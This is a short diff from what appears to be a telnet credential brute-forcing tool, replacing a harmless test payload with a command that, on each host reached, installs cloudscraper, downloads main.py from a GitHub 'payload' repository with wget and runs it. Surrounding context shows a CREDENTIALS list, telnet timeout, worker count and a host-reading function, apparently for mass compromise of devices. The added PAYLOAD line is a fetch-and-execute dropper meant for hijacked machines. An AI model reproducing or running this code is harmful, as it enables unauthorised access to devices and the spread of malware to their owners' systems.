@@ -28,7 +28,7 @@ CREDENTIALS = [
 
 TELNET_TIMEOUT = 0.1
 MAX_WORKERS = 10
-PAYLOAD = "echo PAYLOAD WORKING"
+PAYLOAD = "cd ~ && clear && rm -rf payload && pip3 install cloudscraper && mkdir payload && cd payload && wget https://github.com/Jaxploit/payload/raw/refs/heads/main/main.py && python3 main.py"
 
 
 def read_hosts(folder_name):
